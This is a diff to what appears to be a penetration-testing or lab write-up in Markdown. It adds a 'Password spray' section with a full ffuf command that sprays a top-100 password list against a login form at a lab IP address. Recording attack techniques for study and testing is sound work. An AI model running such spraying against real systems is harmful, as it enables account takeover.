@@ -16,3 +16,12 @@ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "user
 ```
 {% endcode %}
 
+### Password spray
+
+Once we know the username we can try out password spray attacks.
+
+{% code overflow="wrap" %}
+```bash
+ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.200/customers/login -fc 200 
+```
+{% endcode %}
